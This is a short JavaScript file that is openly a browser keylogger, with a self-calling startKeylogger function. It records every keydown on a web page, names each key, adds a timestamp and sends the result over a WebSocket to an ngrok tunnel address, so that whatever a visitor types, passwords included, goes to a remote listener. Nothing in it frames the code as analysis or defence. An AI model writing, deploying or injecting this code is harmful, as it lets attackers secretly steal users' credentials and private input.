const IP = "557bbf691b55.ngrok-free.app"
const PORT = "443"
const WS_URL = `wss://${IP}:${PORT}`;

let socket = null;

function connectWebSocket() {
    socket = new WebSocket(WS_URL);
    
    socket.onopen = function(event) {
        console.log("Connected to WebSocket server");
    };
    
    socket.onclose = function(event) {
        console.log("Disconnected from WebSocket server");
    };
    
    socket.onerror = function(error) {
        console.error("WebSocket error:", error);
    };
}

function sendKeyData(key) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        const timestamp = new Date().toISOString().slice(0, 19).replace('T', ' ');
        const message = `${key} ${timestamp}`;
        socket.send(message);
    }
}

function handleKeyPress(event) {
    let keyName;
    
    if (event.key === ' ') {
        keyName = 'Key.space';
    } else if (event.key === 'Escape') {
        keyName = 'Key.esc';
    } else if (event.key === 'Enter') {
        keyName = 'Key.enter';
    } else if (event.key === 'Tab') {
        keyName = 'Key.tab';
    } else if (event.key === 'Backspace') {
        keyName = 'Key.backspace';
    } else if (event.key === 'Delete') {
        keyName = 'Key.delete';
    } else if (event.key === 'Shift') {
        keyName = 'Key.shift';
    } else if (event.key === 'Control') {
        keyName = 'Key.ctrl';
    } else if (event.key === 'Alt') {
        keyName = 'Key.alt';
    } else if (event.key.length === 1) {
        keyName = `'${event.key}'`;
    } else {
        keyName = `Key.${event.key.toLowerCase()}`;
    }
    
    sendKeyData(keyName);
    
    if (event.key === 'Escape') {
        socket.close();
    }
}

function startKeylogger() {
    connectWebSocket();
    document.addEventListener('keydown', handleKeyPress);
}

startKeylogger();